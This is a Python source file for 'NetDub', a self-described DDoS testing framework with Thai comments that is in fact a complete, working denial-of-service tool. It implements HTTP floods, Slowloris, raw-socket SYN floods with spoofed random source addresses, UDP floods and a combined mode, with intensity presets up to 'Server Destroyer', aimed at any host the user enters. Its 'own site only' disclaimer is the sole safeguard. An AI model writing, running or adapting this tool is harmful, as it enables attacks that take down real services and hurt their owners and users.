#!/usr/bin/env python3
"""
NetDub - Advanced DDoS Testing Framework (Root Only)
สำหรับการทดสอบความแข็งแกร่งของเว็บไซต์เท่านั้น
Requires: sudo python3 netdub.py
"""

import socket
import threading
import time
import random
import sys
import os
import struct
import subprocess
from multiprocessing import Process, Queue, cpu_count
from colorama import Fore, Style, init
import ctypes

# Initialize colorama
init()

class NetDub:
    def __init__(self):
        self.target_host = None
        self.target_port = None
        self.target_ip = None
        self.running = False
        self.threads = []
        self.processes = []
        self.stats = {'sent': 0, 'failed': 0, 'connections': 0}
        
        # Attack intensity levels
        self.attack_levels = {
            '1': {'name': 'Light Test', 'threads': 100, 'rate': 1000, 'processes': 2},
            '2': {'name': 'Medium Test', 'threads': 300, 'rate': 5000, 'processes': 4},
            '3': {'name': 'Heavy Test', 'threads': 500, 'rate': 15000, 'processes': 8},
            '4': {'name': 'Extreme Test', 'threads': 1000, 'rate': 50000, 'processes': 16},
            '5': {'name': 'Nuclear Test', 'threads': 2000, 'rate': 100000, 'processes': 32},
            '6': {'name': 'Impossible Mode', 'threads': 5000, 'rate': 500000, 'processes': 64},
            '7': {'name': 'Server Destroyer', 'threads': 10000, 'rate': 1200000, 'processes': 128}
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ]
    
    def check_root(self):
        """ตรวจสอบสิทธิ์ root - บังคับให้ใช้ root"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
            print(f"{Fore.RED}║                    ACCESS DENIED                             ║{Style.RESET_ALL}")
            print(f"{Fore.RED}║                                                              ║{Style.RESET_ALL}")
            print(f"{Fore.RED}║  NetDub requires ROOT privileges for maximum performance     ║{Style.RESET_ALL}")
            print(f"{Fore.RED}║                                                              ║{Style.RESET_ALL}")
            print(f"{Fore.RED}║  Usage: sudo python3 netdub.py                              ║{Style.RESET_ALL}")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            sys.exit(1)
        
        # เพิ่ม process limits
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
            print(f"{Fore.GREEN}[✓] Root privileges confirmed{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[✓] Process limits optimized{Style.RESET_ALL}")
        except:
            pass
    
    def banner(self):
        """แสดง banner"""
        print(f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                           NetDub                             ║
║                Advanced DDoS Testing Framework               ║
║                        ROOT ONLY MODE                        ║
║                                                              ║
║  ⚠️  สำหรับการทดสอบเว็บไซต์ตัวเองเท่านั้น                   ║
║  ⚠️  การใช้งานผิดกฎหมายถือเป็นความรับผิดชอบของผู้ใช้        ║
║                                                              ║
║  Max Performance: 1.2M+ packets per second                  ║
║  Multi-Layer Attack Support                                 ║
║  Raw Socket Implementation                                   ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    def resolve_host(self):
        """แปลง hostname เป็น IP"""
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
            print(f"{Fore.GREEN}[✓] Resolved {self.target_host} → {self.target_ip}{Style.RESET_ALL}")
            return True
        except socket.gaierror:
            print(f"{Fore.RED}[✗] Cannot resolve hostname: {self.target_host}{Style.RESET_ALL}")
            return False
    
    def test_connection(self):
        """ทดสอบการเชื่อมต่อ"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            return result == 0
        except:
            return False
    
    def get_target_info(self):
        """รับข้อมูลเป้าหมาย"""
        print(f"{Fore.CYAN}[*] Target Configuration{Style.RESET_ALL}")
        self.target_host = input(f"{Fore.GREEN}🌐 Host/Domain: {Style.RESET_ALL}").strip()
        self.target_port = int(input(f"{Fore.GREEN}🔌 Port (80/443): {Style.RESET_ALL}").strip())
        
        # Resolve hostname
        if not self.resolve_host():
            return False
        
        # Test connection
        print(f"{Fore.CYAN}[*] Testing connection...{Style.RESET_ALL}")
        if self.test_connection():
            print(f"{Fore.GREEN}[✓] Connection successful{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[✗] Connection failed{Style.RESET_ALL}")
            return False
    
    def show_attack_menu(self):
        """แสดงเมนูการโจมตี"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                    Attack Intensity Levels                  ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        
        for level, config in self.attack_levels.items():
            intensity_color = Fore.GREEN if int(level) <= 3 else Fore.YELLOW if int(level) <= 5 else Fore.RED
            print(f"{Fore.CYAN}║ {intensity_color}[{level}] {config['name']:<20} {Style.RESET_ALL}{Fore.CYAN}│ {config['rate']:>8,} pps │ {config['threads']:>4} threads ║{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}Select intensity level (1-7): {Style.RESET_ALL}").strip()
        return choice if choice in self.attack_levels else None
    
    def layer7_http_flood(self, config):
        """Layer 7 HTTP Flood Attack"""
        def http_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # สร้าง HTTP request
                    request = f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += f"Accept: */*\r\n"
                    request += f"Connection: keep-alive\r\n\r\n"
                    
                    sock.send(request.encode())
                    sock.close()
                    self.stats['sent'] += 1
                    
                except:
                    self.stats['failed'] += 1
                    time.sleep(0.001)
        
        print(f"{Fore.YELLOW}[*] Starting Layer 7 HTTP Flood...{Style.RESET_ALL}")
        threads = []
        for _ in range(config['threads']):
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def layer7_slowloris(self, config):
        """Layer 7 Slowloris Attack"""
        def slowloris_worker():
            sockets = []
            while self.running:
                try:
                    # สร้าง socket ใหม่
                    if len(sockets) < 1000:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((self.target_ip, self.target_port))
                        
                        # ส่ง partial request
                        request = f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                        request += f"Host: {self.target_host}\r\n"
                        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        sock.send(request.encode())
                        sockets.append(sock)
                    
                    # ส่ง keep-alive headers
                    for sock in sockets[:]:
                        try:
                            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        except:
                            sockets.remove(sock)
                    
                    time.sleep(10)
                    
                except:
                    time.sleep(0.1)
        
        print(f"{Fore.YELLOW}[*] Starting Layer 7 Slowloris...{Style.RESET_ALL}")
        threads = []
        for _ in range(config['threads'] // 10):
            t = threading.Thread(target=slowloris_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def layer4_syn_flood(self, config):
        """Layer 4 SYN Flood Attack"""
        def syn_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while self.running:
                    # สร้าง SYN packet
                    src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    src_port = random.randint(1024, 65535)
                    
                    # สร้าง IP header
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 40, 54321, 0, 64, 6, 0,
                        socket.inet_aton(src_ip),
                        socket.inet_aton(self.target_ip)
                    )
                    
                    # สร้าง TCP header
                    tcp_header = struct.pack('!HHLLBBHHH',
                        src_port, self.target_port, 0, 0, 80, 2, 8192, 0, 0
                    )
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (self.target_ip, self.target_port))
                    self.stats['sent'] += 1
                    
            except Exception as e:
                self.stats['failed'] += 1
        
        print(f"{Fore.YELLOW}[*] Starting Layer 4 SYN Flood...{Style.RESET_ALL}")
        threads = []
        for _ in range(config['threads']):
            t = threading.Thread(target=syn_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def layer3_udp_flood(self, config):
        """Layer 3 UDP Flood Attack"""
        def udp_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"X" * 1024
                
                while self.running:
                    for _ in range(100):
                        sock.sendto(data, (self.target_ip, self.target_port))
                        self.stats['sent'] += 1
                    time.sleep(0.001)
                    
            except:
                self.stats['failed'] += 1
        
        print(f"{Fore.YELLOW}[*] Starting Layer 3 UDP Flood...{Style.RESET_ALL}")
        threads = []
        for _ in range(config['threads']):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def multi_layer_attack(self, config):
        """Multi-Layer Combined Attack"""
        print(f"{Fore.RED}[*] Starting Multi-Layer Attack...{Style.RESET_ALL}")
        all_threads = []
        
        # Layer 7 HTTP Flood (40%)
        http_config = config.copy()
        http_config['threads'] = int(config['threads'] * 0.4)
        all_threads.extend(self.layer7_http_flood(http_config))
        
        # Layer 7 Slowloris (20%)
        slow_config = config.copy()
        slow_config['threads'] = int(config['threads'] * 0.2)
        all_threads.extend(self.layer7_slowloris(slow_config))
        
        # Layer 4 SYN Flood (30%)
        syn_config = config.copy()
        syn_config['threads'] = int(config['threads'] * 0.3)
        all_threads.extend(self.layer4_syn_flood(syn_config))
        
        # Layer 3 UDP Flood (10%)
        udp_config = config.copy()
        udp_config['threads'] = int(config['threads'] * 0.1)
        all_threads.extend(self.layer3_udp_flood(udp_config))
        
        return all_threads
    
    def show_attack_types(self):
        """แสดงประเภทการโจมตี"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                       Attack Types                           ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ [1] Layer 7 HTTP Flood        │ Application Layer Attack    ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ [2] Layer 7 Slowloris         │ Slow Connection Attack      ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ [3] Layer 4 SYN Flood         │ Transport Layer Attack      ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ [4] Layer 3 UDP Flood         │ Network Layer Attack        ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ [5] Multi-Layer Combined      │ All Layers Attack           ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}Select attack type (1-5): {Style.RESET_ALL}").strip()
        return choice
    
    def stats_monitor(self):
        """แสดงสถิติการโจมตี"""
        start_time = time.time()
        while self.running:
            current_time = time.time()
            elapsed = current_time - start_time
            
            if elapsed > 0:
                pps = self.stats['sent'] / elapsed
                print(f"{Fore.BLUE}[📊] Time: {elapsed:.0f}s | Sent: {self.stats['sent']:,} | Failed: {self.stats['failed']:,} | Rate: {pps:,.0f} pps{Style.RESET_ALL}")
            
            time.sleep(1)
    
    def run_attack(self, intensity_level, attack_type):
        """เริ่มการโจมตี"""
        config = self.attack_levels[intensity_level]
        
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.RED}║                      ATTACK INITIATED                       ║{Style.RESET_ALL}")
        print(f"{Fore.RED}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.RED}║ Target: {self.target_host:<20} │ Port: {self.target_port:<6}           ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ Level: {config['name']:<21} │ Threads: {config['threads']:<8}      ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ Expected Rate: {config['rate']:,} pps                            ║{Style.RESET_ALL}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # เริ่มการโจมตี
        self.running = True
        self.stats = {'sent': 0, 'failed': 0, 'connections': 0}
        
        # เริ่ม stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        # เลือกประเภทการโจมตี
        attack_threads = []
        if attack_type == '1':
            attack_threads = self.layer7_http_flood(config)
        elif attack_type == '2':
            attack_threads = self.layer7_slowloris(config)
        elif attack_type == '3':
            attack_threads = self.layer4_syn_flood(config)
        elif attack_type == '4':
            attack_threads = self.layer3_udp_flood(config)
        elif attack_type == '5':
            attack_threads = self.multi_layer_attack(config)
        
        print(f"{Fore.GREEN}[✓] Attack started with {len(attack_threads)} threads{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack stopped by user{Style.RESET_ALL}")
        finally:
            self.running = False
            print(f"{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
            time.sleep(2)
            print(f"{Fore.GREEN}[✓] Attack completed{Style.RESET_ALL}")
    
    def main(self):
        """หลักการทำงาน"""
        self.check_root()
        self.banner()
        
        if not self.get_target_info():
            return
        
        # เลือกระดับความรุนแรง
        intensity_level = self.show_attack_menu()
        if not intensity_level:
            print(f"{Fore.RED}[!] Invalid intensity level{Style.RESET_ALL}")
            return
        
        # เลือกประเภทการโจมตี
        attack_type = self.show_attack_types()
        if attack_type not in ['1', '2', '3', '4', '5']:
            print(f"{Fore.RED}[!] Invalid attack type{Style.RESET_ALL}")
            return
        
        # ยืนยันการโจมตี
        confirm = input(f"{Fore.RED}⚠️  Confirm attack? (YES/no): {Style.RESET_ALL}").strip()
        if confirm.upper() != 'YES':
            print(f"{Fore.YELLOW}[*] Attack cancelled{Style.RESET_ALL}")
            return
        
        # เริ่มการโจมตี
        self.run_attack(intensity_level, attack_type)

if __name__ == "__main__":
    try:
        netdub = NetDub()
        netdub.main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
